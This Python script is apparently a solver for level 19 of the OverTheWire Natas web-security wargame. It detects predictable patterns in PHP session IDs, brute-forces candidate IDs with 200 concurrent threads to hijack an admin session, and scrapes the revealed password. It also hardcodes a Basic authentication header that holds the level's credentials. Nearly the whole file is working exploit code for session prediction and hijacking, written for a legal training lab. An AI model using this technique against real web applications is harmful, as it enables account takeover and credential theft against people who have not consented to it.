if __name__ == '__main__':
    import requests
    def build_url(level): return f'http://natas{level}.natas.labs.overthewire.org/'
    from tqdm import tqdm
else:
    from common import *

import concurrent.futures

MAX_WORKERS = 200

def find_identical(k=40):    # k is number of requests to make
    global MAX_WORKERS
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,he;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://natas19.natas.labs.overthewire.org',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/',
        'Authorization': 'Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw=='
    }
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(MAX_WORKERS, k)) as pool:
        results = pool.map(lambda _: requests.post(build_url(level=19), 'username=a&password=b', headers=headers), range(k))
    
    ids = []
    for result in results:
        cookie = result.headers['Set-Cookie']
        start = cookie.find('PHPSESSID=') + len('PHPSESSID=')
        ids.append(cookie[start:cookie.find(';', start)])
    
    # find unchanging chars from start or end because there's a part which has variable number of chars. not all are the same length
    min_length = len(min(ids, key=len))
    
    leading_equal_chars = []
    for i in range(min_length):
        if all(id[i] == ids[0][i] for id in ids):
            leading_equal_chars.append(i)
    
    trailing_equal_chars = []
    for i in range(min_length):
        if all(id[-i-1] == ids[0][-i-1] for id in ids):
            trailing_equal_chars.append(-i-1)
    
    
    # for id in ids:
    #     print(id)
    # print(ids)
    
    return leading_equal_chars, trailing_equal_chars, ids[0], max(len(id) for id in ids)



DONE = False
def test_id(session_id):
    global DONE
    if DONE:
        return False, ''
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,he;q=0.8',
        'Authorization': 'Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Cookie': f'PHPSESSID={session_id}',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0',
    }

    result = requests.get(build_url(level=19), headers=headers)
    if 'Login as an admin' not in result.text and 'Please login with your admin account' not in result.text:
        start = result.text.find('Password: ')
        password = result.text[start+len('Password: '):result.text.find('</pre>', start)]
        DONE = True
        return True, password
    return False, ''

def gen_ids(leading_equal_chars, trailing_equal_chars, example_id, max_length):
    for i in range(10**(max_length-len(leading_equal_chars)-len(trailing_equal_chars))):
        lst_string = list(str(i))                                       # so we can edit i as a string just as you can edit a list
        for j in leading_equal_chars:
            if j<len(lst_string) and lst_string[j] != example_id[j]:    # shortcircuiting so we don't get an index error. we know the id
                                                                        # contains the index because of how we found the identical chars
                lst_string.insert(j, example_id[j])
        
        for j in trailing_equal_chars:
            # we're gonna decode the negative ourselves because we don't want -1+1=0, we want -1+1=len(lst_string)
            index = j + len(lst_string) + 1                             # we already know that j is negative
            if (-len(lst_string) < index < len(lst_string) and lst_string[index] != example_id[index]) or index == len(lst_string):
                lst_string.insert(index, example_id[j])
        
        yield ''.join(lst_string)

def solve(driver, _=None):
    global MAX_WORKERS
    # leading_equal_chars, trailing_equal_chars, example_id, max_length = find_identical()  # was technically right but wasn't really working.
                                                                                            # so i'm hardcoding the values
    leading_equal_chars = [0,2]
    trailing_equal_chars = [-1,-2,-3,-4]
    example_id = '3330342d61'
    max_length = len(example_id)
    
    # print(f'leading_equal_chars = {leading_equal_chars}')
    # print(f'trailing_equal_chars = {trailing_equal_chars}')
    
    password = ''
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        results = pool.map(test_id, gen_ids(leading_equal_chars, trailing_equal_chars, example_id, max_length))
    
        for result in tqdm(results, total=10**(max_length-len(leading_equal_chars)-len(trailing_equal_chars))):
            if result[0]:
                password = result[1]
                break
        else:
            raise Exception('No solving session id found')

    if driver: driver.get(build_url(password = password, level=19))
    return password


if __name__ == '__main__':
    print(solve(None))
    # print(find_identical(100))
    # for a in gen_ids([0], [-1,-2,-3,-4,-6], '3330342d61', len('3330342d61')):
    #     print(a)